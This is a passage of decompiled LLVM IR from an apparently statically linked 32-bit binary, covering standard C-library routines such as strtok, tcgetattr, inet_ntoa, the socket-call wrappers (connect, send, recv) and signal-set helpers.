  %v3_804f89c = select i1 %v4_804f892, i32 0, i32 %v1_804f89c
  store i32 %v3_804f89c, i32* @edi, align 4
  %v5_804f8a2 = inttoptr i32 %v0_804f8a2 to i8*
  store i8* %v5_804f8a2, i8** %stack_var_-108, align 4
  %v3_804f8a3 = call i32 @strlen(i8* %v5_804f8a2)
  %v1_804f8ab = add i32 %v3_804f8a3, 1
  store i32 %v1_804f8ab, i32* %ebx.global-to-local, align 4
  %v1_804f8ae = load i32, i32* @edi, align 4
  %tmp = icmp ugt i32 %v1_804f8ab, %v1_804f8ae
  br i1 %tmp, label %dec_label_pc_804f8b2, label %dec_label_pc_804f8b9

dec_label_pc_804f8b2:                             ; preds = %dec_label_pc_804f892
  store i32 %v1_804f8ae, i32* %ebx.global-to-local, align 4
  store i32 34, i32* @ebp, align 4
  br label %dec_label_pc_804f8b9

dec_label_pc_804f8b9:                             ; preds = %dec_label_pc_804f892, %dec_label_pc_804f8b2
  %v0_804f8be = phi i32 [ %v1_804f8ab, %dec_label_pc_804f892 ], [ %v1_804f8ae, %dec_label_pc_804f8b2 ]
  %v1_804f8b9 = icmp eq i32 %v0_804f8be, 0
  br i1 %v1_804f8b9, label %dec_label_pc_804f8d5, label %dec_label_pc_804f8bd

dec_label_pc_804f8bd:                             ; preds = %dec_label_pc_804f8b9
  %v0_804f8bf = load i32, i32* @esi, align 4
  %v8_804f8c0 = inttoptr i32 %arg2 to i8*
  store i8* %v8_804f8c0, i8** %stack_var_-108, align 4
  %tmp45 = inttoptr i32 %arg2 to i16*
  %v6_804f8c4 = call i32 @memcpy(i16* %tmp45, i32 %v0_804f8bf, i32 %v0_804f8be)
  %v1_804f8d0 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804f8d0 = add i32 %arg2, -1
  %v3_804f8d0 = add i32 %v2_804f8d0, %v1_804f8d0
  %v4_804f8d0 = inttoptr i32 %v3_804f8d0 to i8*
  store i8 0, i8* %v4_804f8d0, align 1
  br label %dec_label_pc_804f8d5

dec_label_pc_804f8d5:                             ; preds = %dec_label_pc_804f8b9, %dec_label_pc_804f8bd
  %v0_804f8d5 = load i32, i32* @ebp, align 4
  %v1_804f8d5 = icmp eq i32 %v0_804f8d5, 0
  br i1 %v1_804f8d5, label %dec_label_pc_804f8e0, label %dec_label_pc_804f8d9

dec_label_pc_804f8d9:                             ; preds = %dec_label_pc_804f8d5
  %v0_804f8d9 = load i8*, i8** %stack_var_-108, align 4
  %v1_804f8d9 = ptrtoint i8* %v0_804f8d9 to i32
  %v2_804f8d9 = call i32 @__errno_location(i32 %v1_804f8d9)
  %v0_804f8de = load i32, i32* @ebp, align 4
  %v2_804f8de = inttoptr i32 %v2_804f8d9 to i32*
  store i32 %v0_804f8de, i32* %v2_804f8de, align 4
  %v0_804f8e3.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804f8e0

dec_label_pc_804f8e0:                             ; preds = %dec_label_pc_804f8d5, %dec_label_pc_804f8d9
  %v0_804f8e3 = phi i32 [ 0, %dec_label_pc_804f8d5 ], [ %v0_804f8e3.pre, %dec_label_pc_804f8d9 ]
  ret i32 %v0_804f8e3

; uselistorder directives
  uselistorder i32 %v1_804f8ae, { 1, 2, 0 }
  uselistorder i32 %v1_804f8ab, { 1, 0, 2 }
  uselistorder i32 %v1_804f857, { 0, 2, 1 }
  uselistorder i32 %v3_804f854, { 1, 0 }
  uselistorder i8** %stack_var_-108, { 4, 3, 2, 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2 }
  uselistorder i32 (i8*)* @strlen, { 2, 1, 0, 3 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_8053720.112 to i32), { 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_804f8e0, { 1, 0 }
  uselistorder label %dec_label_pc_804f8d5, { 1, 0 }
  uselistorder label %dec_label_pc_804f8b9, { 1, 0 }
  uselistorder label %dec_label_pc_804f892, { 1, 0 }
  uselistorder label %dec_label_pc_804f851, { 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_804f8fc = inttoptr i32 %arg1 to i8*
  %v4_804f8fc = call i32 @strtok_r(i8* %v3_804f8fc, i32 %arg2, i32 ptrtoint (i32* @global_var_805b940.114 to i32))
  ret i32 %v4_804f8fc
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-60 = alloca i32, align 4
  %v3_804f914 = call i32 @__GI_tcgetattr(i32 %arg1, i32* nonnull %stack_var_-60)
  %v1_804f919 = icmp eq i32 %v3_804f914, 0
  %v1_804f91b = zext i1 %v1_804f919 to i32
  ret i32 %v1_804f91b
}

define i32 @__GI_tcgetattr(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_2()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = ptrtoint i32* %arg2 to i32
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804f928 = load i32, i32* @esi, align 4
  %v0_804f929 = load i32, i32* @ebx, align 4
  store i32 %v0_804f929, i32* %stack_var_-8, align 4
  %v2_804f92d = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_804f92d, i32* %eax.global-to-local, align 4
  store i32 %tmp8, i32* @ebx, align 4
  %v3_804f93f = call i32 @ioctl(i32 %arg1, i32 21505, i32 %v2_804f92d)
  store i32 %v3_804f93f, i32* %eax.global-to-local, align 4
  %v1_804f947 = icmp eq i32 %v3_804f93f, 0
  store i32 %v3_804f93f, i32* @esi, align 4
  %v1_804f94b = icmp eq i1 %v1_804f947, false
  br i1 %v1_804f94b, label %dec_label_pc_804f990, label %dec_label_pc_804f94d

dec_label_pc_804f94d:                             ; preds = %entry
  %v3_804f94d = load i32, i32* %stack_var_-44, align 4
  %v1_804f951 = load i32, i32* @ebx, align 4
  %v2_804f951 = inttoptr i32 %v1_804f951 to i32*
  store i32 %v3_804f94d, i32* %v2_804f951, align 4
  %v1_804f957 = load i32, i32* @ebx, align 4
  %v2_804f957 = add i32 %v1_804f957, 4
  %v3_804f957 = inttoptr i32 %v2_804f957 to i32*
  %v1_804f95e = load i32, i32* @ebx, align 4
  %v2_804f95e = add i32 %v1_804f95e, 8
  %v3_804f95e = inttoptr i32 %v2_804f95e to i32*
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v1_804f965 = load i32, i32* @ebx, align 4
  %v2_804f965 = add i32 %v1_804f965, 12
  %v3_804f965 = inttoptr i32 %v2_804f965 to i32*
  store i32 %tmp3, i32* %v3_804f965, align 4
  %v4_804f968 = zext i8 %tmp to i32
  %v5_804f968 = load i32, i32* %eax.global-to-local, align 4
  %v6_804f968 = and i32 %v5_804f968, -256
  %v7_804f968 = or i32 %v6_804f968, %v4_804f968
  store i32 %v7_804f968, i32* %eax.global-to-local, align 4
  %v2_804f96c = load i32, i32* @ebx, align 4
  %v3_804f96c = add i32 %v2_804f96c, 16
  %v4_804f96c = inttoptr i32 %v3_804f96c to i8*
  store i8 %tmp, i8* %v4_804f96c, align 1
  %v0_804f96f = load i32, i32* %eax.global-to-local, align 4
  %v2_804f972 = ptrtoint i32* %stack_var_-27 to i32
  %v0_804f977 = load i32, i32* @ebx, align 4
  %v1_804f977 = add i32 %v0_804f977, 17
  store i32 %v1_804f977, i32* %eax.global-to-local, align 4
  %v4_804f97b = call i32 @__GI_mempcpy(i32 %v1_804f977, i32 %v2_804f972, i32 19, i32 %v0_804f96f)
  store i32 %v4_804f97b, i32* %eax.global-to-local, align 4
  %v3_804f988 = inttoptr i32 %v4_804f97b to i8*
  %v4_804f988 = call i32 @__GI_memset(i8* %v3_804f988, i32 0, i32 13)
  store i32 %v4_804f988, i32* %eax.global-to-local, align 4
  %v0_804f993.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804f990

dec_label_pc_804f990:                             ; preds = %entry, %dec_label_pc_804f94d
  %v0_804f993 = phi i32 [ %v3_804f93f, %entry ], [ %v0_804f993.pre, %dec_label_pc_804f94d ]
  store i32 %v0_804f993, i32* %eax.global-to-local, align 4
  %v2_804f995 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804f995, i32* @ebx, align 4
  store i32 %v0_804f928, i32* @esi, align 4
  ret i32 %v0_804f993

; uselistorder directives
  uselistorder i32 %v0_804f993, { 1, 0 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder i8 %tmp, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 6, 7, 8, 9, 4, 5 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804f990, { 1, 0 }
}

define i32 @htons(i16 %arg1) local_unnamed_addr {
entry:
  %v3_804f99d = call i16 @llvm.bswap.i16(i16 %arg1)
  %v4_804f99d = zext i16 %v3_804f99d to i32
  ret i32 %v4_804f99d
}

define i32 @htonl() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v1_804f9a9 = call i32 @llvm.bswap.i32(i32 %tmp)
  ret i32 %v1_804f9a9
}

define i32 @ntohs(i16 %arg1) local_unnamed_addr {
entry:
  %v3_804f9b1 = call i16 @llvm.bswap.i16(i16 %arg1)
  %v4_804f9b1 = zext i16 %v3_804f9b1 to i32
  ret i32 %v4_804f9b1
}

define i32 @ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v1_804f9bd = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_804f9bd
}

define i32 @__GI_inet_ntoa_r(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804f9c0 = load i32, i32* @edi, align 4
  store i32 0, i32* @edi, align 4
  %v0_804f9c3 = load i32, i32* @esi, align 4
  store i32 0, i32* @esi, align 4
  %v0_804f9c6 = load i32, i32* @ebx, align 4
  store i32 %v0_804f9c6, i32* %stack_var_-12, align 4
  %v1_804f9cf = call i32 @llvm.bswap.i32(i32 %arg1)
  %sext = mul i32 %v1_804f9cf, 16777216
  %v1_804f9d1 = sdiv i32 %sext, 16777216
  store i32 %v1_804f9d1, i32* @ebx, align 4
  %v1_804f9d3 = add i32 %arg2, 15
  store i32 %v1_804f9d3, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804f9d8

dec_label_pc_804f9d8:                             ; preds = %entry, %dec_label_pc_804f9fd
  %v0_804f9df17 = phi i32 [ %v1_804f9d1, %entry ], [ %v2_804f9fd, %dec_label_pc_804f9fd ]
  %v0_804fa0916 = phi i32 [ %v1_804f9d3, %entry ], [ %v0_804fa01, %dec_label_pc_804f9fd ]
  %v1_804f9e3 = urem i32 %v0_804f9df17, 256
  %v5_804f9eb = inttoptr i32 %v0_804fa0916 to i8*
  %v6_804f9eb = call i32 @_uintmaxtostr(i8* %v5_804f9eb, i32 %v1_804f9e3, i32 0, i32 -10, i32 0)
  %v0_804f9f3 = load i32, i32* @esi, align 4
  %v1_804f9f3 = icmp eq i32 %v0_804f9f3, 0
  %v1_804f9f5 = add i32 %v6_804f9eb, -1
  store i32 %v1_804f9f5, i32* %ecx.global-to-local, align 4
  br i1 %v1_804f9f3, label %dec_label_pc_804f9fd, label %dec_label_pc_804f9fa

dec_label_pc_804f9fa:                             ; preds = %dec_label_pc_804f9d8
  %v1_804f9fa = inttoptr i32 %v0_804f9f3 to i8*
  store i8 46, i8* %v1_804f9fa, align 1
  %v0_804fa01.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804f9fd

dec_label_pc_804f9fd:                             ; preds = %dec_label_pc_804f9d8, %dec_label_pc_804f9fa
  %v0_804fa01 = phi i32 [ %v1_804f9f5, %dec_label_pc_804f9d8 ], [ %v0_804fa01.pre, %dec_label_pc_804f9fa ]
  %v0_804f9fd = load i32, i32* @ebx, align 4
  %v2_804f9fd = udiv i32 %v0_804f9fd, 256
  store i32 %v2_804f9fd, i32* @ebx, align 4
  %v0_804fa00 = load i32, i32* @edi, align 4
  %v1_804fa00 = add i32 %v0_804fa00, 1
  store i32 %v1_804fa00, i32* @edi, align 4
  store i32 %v0_804fa01, i32* @esi, align 4
  %v7_804fa06 = icmp sgt i32 %v1_804fa00, 3
  br i1 %v7_804fa06, label %dec_label_pc_804fa08, label %dec_label_pc_804f9d8

dec_label_pc_804fa08:                             ; preds = %dec_label_pc_804f9fd
  %v2_804fa08 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804fa08, i32* @ebx, align 4
  %v1_804fa09 = add i32 %v0_804fa01, 1
  store i32 %v0_804f9c3, i32* @esi, align 4
  store i32 %v0_804f9c0, i32* @edi, align 4
  ret i32 %v1_804fa09

; uselistorder directives
  uselistorder i32 %v0_804fa01, { 0, 2, 1 }
  uselistorder i32 %v1_804f9d1, { 1, 0 }
  uselistorder i32 (i8*, i32, i32, i32, i32)* @_uintmaxtostr, { 2, 0, 1 }
  uselistorder i32 -10, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804f9fd, { 1, 0 }
  uselistorder label %dec_label_pc_804f9d8, { 1, 0 }
}

define i32 @__GI_inet_ntoa(i32 %arg1) local_unnamed_addr {
entry:
  %v2_804fa1b = call i32 @__GI_inet_ntoa_r(i32 %arg1, i32 ptrtoint (i32* @global_var_805b944.115 to i32))
  ret i32 %v2_804fa1b
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v2_804fa27 = ptrtoint i32* %stack_var_-4 to i32
  %v2_804fa30 = inttoptr i32 %arg1 to i8*
  %v3_804fa30 = call i32 @inet_aton(i8* %v2_804fa30, i32 %v2_804fa27)
  %v1_804fa3b = icmp eq i32 %v3_804fa30, 0
  br i1 %v1_804fa3b, label %dec_label_pc_804fa43, label %dec_label_pc_804fa3f

dec_label_pc_804fa3f:                             ; preds = %entry
  %v3_804fa3f = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804fa43

dec_label_pc_804fa43:                             ; preds = %entry, %dec_label_pc_804fa3f
  %v0_804fa43 = phi i32 [ -1, %entry ], [ %v3_804fa3f, %dec_label_pc_804fa3f ]
  ret i32 %v0_804fa43

; uselistorder directives
  uselistorder label %dec_label_pc_804fa43, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804fa67 = ptrtoint i32* %stack_var_-12 to i32
  %v2_804fa6e = call i32 @__socketcall(i32 3, i32 %v2_804fa67)
  ret i32 %v2_804fa6e

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804fa93 = ptrtoint i32* %stack_var_-12 to i32
  %v2_804fa9a = call i32 @__socketcall(i32 6, i32 %v2_804fa93)
  ret i32 %v2_804fa9a

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_804facf = ptrtoint i32* %stack_var_-20 to i32
  %v2_804fad6 = call i32 @__socketcall(i32 15, i32 %v2_804facf)
  ret i32 %v2_804fad6

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_804fb03 = ptrtoint i32* %stack_var_-16 to i32
  %v2_804fb0a = call i32 @__socketcall(i32 10, i32 %v2_804fb03)
  ret i32 %v2_804fb0a

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_804fb37 = ptrtoint i32* %stack_var_-16 to i32
  %v2_804fb3e = call i32 @__socketcall(i32 9, i32 %v2_804fb37)
  ret i32 %v2_804fb3e

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_804fb7b = ptrtoint i32* %stack_var_-24 to i32
  %v2_804fb82 = call i32 @__socketcall(i32 11, i32 %v2_804fb7b)
  ret i32 %v2_804fb82

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_804fbb7 = ptrtoint i32* %stack_var_-20 to i32
  %v2_804fbbe = call i32 @__socketcall(i32 14, i32 %v2_804fbb7)
  ret i32 %v2_804fbbe

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804fbe3 = ptrtoint i32* %stack_var_-12 to i32
  %v2_804fbea = call i32 @__socketcall(i32 1, i32 %v2_804fbe3)
  ret i32 %v2_804fbea

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32)* @__socketcall, { 6, 5, 4, 0, 1, 3, 7, 2 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp3 = icmp slt i32 %arg1, 1
  br i1 %tmp3, label %dec_label_pc_804fc0c, label %dec_label_pc_804fbff

dec_label_pc_804fbff:                             ; preds = %entry
  %v1_804fbff = add i32 %arg1, -64
  %v3_804fbff = sub i32 63, %arg1
  %v4_804fbff = and i32 %v3_804fbff, %arg1
  %v5_804fbff = icmp slt i32 %v4_804fbff, 0
  %v6_804fbff = icmp eq i32 %v1_804fbff, 0
  %v7_804fbff = icmp slt i32 %v1_804fbff, 0
  %v3_804fc02 = icmp eq i1 %v7_804fbff, %v5_804fbff
  %v4_804fc02 = icmp eq i1 %v6_804fbff, false
  %v5_804fc02 = and i1 %v4_804fc02, %v3_804fc02
  br i1 %v5_804fc02, label %dec_label_pc_804fc0c, label %dec_label_pc_804fc04

dec_label_pc_804fc04:                             ; preds = %dec_label_pc_804fbff
  %v4_804fc07 = call i32 @__sigaddset(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_804fc0c

dec_label_pc_804fc0c:                             ; preds = %dec_label_pc_804fbff, %entry, %dec_label_pc_804fc04
  %v1_804fc0c = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_804fc11 = inttoptr i32 %v1_804fc0c to i32*
  store i32 22, i32* %v1_804fc11, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_804fbff, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_804fc0c, { 2, 0, 1 }
}

define i32 @sigemptyset(i32 %arg1) local_unnamed_addr {
entry:
  %v3_804fc2e = inttoptr i32 %arg1 to i8*
  %v4_804fc2e = call i32 @__GI_memset(i8* %v3_804fc2e, i32 0, i32 128)
  ret i32 0
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_804fc3c = load i32, i32* @ebx, align 4
  %v15_804fc3d = ptrtoint i32* %stack_var_-300 to i32
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v10_804fc51 = icmp eq i32 %arg2, -1
  br i1 %v10_804fc51, label %dec_label_pc_804fc5f, label %dec_label_pc_804fc56

dec_label_pc_804fc56:                             ; preds = %entry
  %tmp16 = icmp slt i32 %arg1, 1
  br i1 %tmp16, label %dec_label_pc_804fc5f, label %dec_label_pc_804fc5a

dec_label_pc_804fc5a:                             ; preds = %dec_label_pc_804fc56
  %v7_804fc5d = icmp sgt i32 %arg1, 64
  br i1 %v7_804fc5d, label %dec_label_pc_804fc5f, label %dec_label_pc_804fc6c

dec_label_pc_804fc5f:                             ; preds = %dec_label_pc_804fc5a, %dec_label_pc_804fc56, %entry
  %v1_804fc5f = call i32 @__errno_location(i32 %v0_804fc3c)
  store i32 %v1_804fc5f, i32* %eax.global-to-local, align 4
  %v1_804fc64 = inttoptr i32 %v1_804fc5f to i32*
  store i32 22, i32* %v1_804fc64, align 4
  br label %dec_label_pc_804fce0

dec_label_pc_804fc6c:                             ; preds = %dec_label_pc_804fc5a
  store i32 %arg2, i32* %stack_var_-144, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fc7a

dec_label_pc_804fc7a:                             ; preds = %dec_label_pc_804fc7a.dec_label_pc_804fc7a_crit_edge, %dec_label_pc_804fc6c
  %v0_804fc7a = phi i32 [ %v15_804fc3d, %dec_label_pc_804fc6c ], [ %v0_804fc7a.pre, %dec_label_pc_804fc7a.dec_label_pc_804fc7a_crit_edge ]
  %v1_804fc8517 = phi i32 [ 31, %dec_label_pc_804fc6c ], [ %v1_804fc85, %dec_label_pc_804fc7a.dec_label_pc_804fc7a_crit_edge ]
  %v2_804fc7a = mul i32 %v1_804fc8517, 4
  %v3_804fc7a = add i32 %v2_804fc7a, 160
  %v4_804fc7a = add i32 %v3_804fc7a, %v0_804fc7a
  %v5_804fc7a = inttoptr i32 %v4_804fc7a to i32*
  store i32 0, i32* %v5_804fc7a, align 4
  %v0_804fc85.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_804fc85 = add i32 %v0_804fc85.pre, -1
  %v9_804fc85 = icmp slt i32 %v1_804fc85, 0
  store i32 %v1_804fc85, i32* %eax.global-to-local, align 4
  %v1_804fc86 = icmp eq i1 %v9_804fc85, false
  br i1 %v1_804fc86, label %dec_label_pc_804fc7a.dec_label_pc_804fc7a_crit_edge, label %dec_label_pc_804fc88

dec_label_pc_804fc7a.dec_label_pc_804fc7a_crit_edge: ; preds = %dec_label_pc_804fc7a
  %v0_804fc7a.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804fc7a

dec_label_pc_804fc88:                             ; preds = %dec_label_pc_804fc7a
  %v0_804fc88 = load i32, i32* @edx, align 4
  %v2_804fc8b = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_804fc8b, i32* %eax.global-to-local, align 4
  %v4_804fc93 = call i32 @__sigaddset(i32 %v2_804fc8b, i32 %arg1, i32 %v0_804fc88, i32 %v0_804fc88)
  store i32 %v4_804fc93, i32* %eax.global-to-local, align 4
  %v2_804fc9b = icmp slt i32 %v4_804fc93, 0
  br i1 %v2_804fc9b, label %dec_label_pc_804fce0, label %dec_label_pc_804fc9f

dec_label_pc_804fc9f:                             ; preds = %dec_label_pc_804fc88
  %v4_804fca7 = call i32 @__sigismember(i32 ptrtoint (i32* @global_var_805b9a0.116 to i32), i32 %arg1, i32 %v4_804fc93, i32 %v4_804fc93)
  %v2_804fcc0 = ptrtoint i32* %stack_var_-284 to i32
  %v2_804fcc5 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_804fcc5, i32* %eax.global-to-local, align 4
  %v4_804fcce = call i32 @__libc_sigaction(i32 %arg1, i32* nonnull %stack_var_-144, i32 %v2_804fcc0)
  store i32 %v4_804fcce, i32* %eax.global-to-local, align 4
  %v2_804fcd6 = icmp slt i32 %v4_804fcce, 0
  br i1 %v2_804fcd6, label %dec_label_pc_804fce0, label %dec_label_pc_804fcda

dec_label_pc_804fcda:                             ; preds = %dec_label_pc_804fc9f
  %v3_804fcda = load i32, i32* %stack_var_-284, align 4
  br label %dec_label_pc_804fce3

dec_label_pc_804fce0:                             ; preds = %dec_label_pc_804fc9f, %dec_label_pc_804fc88, %dec_label_pc_804fc5f
  br label %dec_label_pc_804fce3

dec_label_pc_804fce3:                             ; preds = %dec_label_pc_804fcda, %dec_label_pc_804fce0
  %storemerge = phi i32 [ -1, %dec_label_pc_804fce0 ], [ %v3_804fcda, %dec_label_pc_804fcda ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_804fc3c, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_804fc85, { 2, 1, 0 }
  uselistorder i32* %stack_var_-144, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 7, 0, 1, 2, 3, 4, 8, 9, 5, 6 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 1, 4, 0, 5 }
  uselistorder label %dec_label_pc_804fce3, { 1, 0 }
}

define i32 @__sigismember(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_804fcfa = add i32 %arg2, -1
  %v1_804fcfd = urem i32 %v1_804fcfa, 32
  %v2_804fcfd = icmp eq i32 %v1_804fcfd, 0
  %v2_804fd00 = udiv i32 %v1_804fcfa, 32
  br i1 %v2_804fcfd, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v5_804fd03 = shl i32 1, %v1_804fcfd
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_804fd05 = phi i32 [ 1, %entry ], [ %v5_804fd03, %bb ]
  %v2_804fd05 = mul nuw nsw i32 %v2_804fd00, 4
  %v3_804fd05 = add i32 %v2_804fd05, %arg1
  %v4_804fd05 = inttoptr i32 %v3_804fd05 to i32*
  %v5_804fd05 = load i32, i32* %v4_804fd05, align 4
  %v7_804fd05 = and i32 %v5_804fd05, %v6_804fd05
  %v8_804fd05 = icmp eq i32 %v7_804fd05, 0
  %v1_804fd09 = icmp eq i1 %v8_804fd05, false
  %v2_804fd09 = zext i1 %v1_804fd09 to i32
  ret i32 %v2_804fd09

; uselistorder directives
  uselistorder i32 %v1_804fcfd, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__sigaddset(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804fd10 = load i32, i32* @ebx, align 4
  store i32 %v0_804fd10, i32* %stack_var_-4, align 4
  %v1_804fd1e = add i32 %arg2, -1
  %v1_804fd21 = urem i32 %v1_804fd1e, 32
  %v2_804fd21 = icmp eq i32 %v1_804fd21, 0
  store i32 %v1_804fd21, i32* @ecx, align 4
  br i1 %v2_804fd21, label %bb6, label %bb

bb:                                               ; preds = %entry
  %v5_804fd24 = shl i32 1, %v1_804fd21
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  %v6_804fd29 = phi i32 [ 1, %entry ], [ %v5_804fd24, %bb ]
  %v2_804fd26 = udiv i32 %v1_804fd1e, 32
  store i32 %v2_804fd26, i32* @edx, align 4
  %v2_804fd29 = mul nuw nsw i32 %v2_804fd26, 4
  %v3_804fd29 = add i32 %v2_804fd29, %arg1
  %v4_804fd29 = inttoptr i32 %v3_804fd29 to i32*
  %v5_804fd29 = load i32, i32* %v4_804fd29, align 4
  %v7_804fd29 = or i32 %v5_804fd29, %v6_804fd29
  store i32 %v7_804fd29, i32* %v4_804fd29, align 4
  %v2_804fd2e = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fd2e, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_804fd26, { 1, 0 }
  uselistorder i32 %v1_804fd21, { 2, 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_804fd3e = add i32 %arg2, -1
  %v1_804fd41 = urem i32 %v1_804fd3e, 32
  %v2_804fd41 = icmp eq i32 %v1_804fd41, 0
  br i1 %v2_804fd41, label %bb6, label %bb

bb:                                               ; preds = %entry
  %v4_804fd44 = shl i32 -2, %v1_804fd41
  %v5_804fd44 = sub nsw i32 32, %v1_804fd41
  %v6_804fd44 = lshr i32 -2, %v5_804fd44
  %v7_804fd44 = or i32 %v6_804fd44, %v4_804fd44
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  %v6_804fd49 = phi i32 [ -2, %entry ], [ %v7_804fd44, %bb ]
  %v2_804fd46 = udiv i32 %v1_804fd3e, 32
  %v2_804fd49 = mul nuw nsw i32 %v2_804fd46, 4
  %v3_804fd49 = add i32 %v2_804fd49, %arg1
  %v4_804fd49 = inttoptr i32 %v3_804fd49 to i32*
  %v5_804fd49 = load i32, i32* %v4_804fd49, align 4
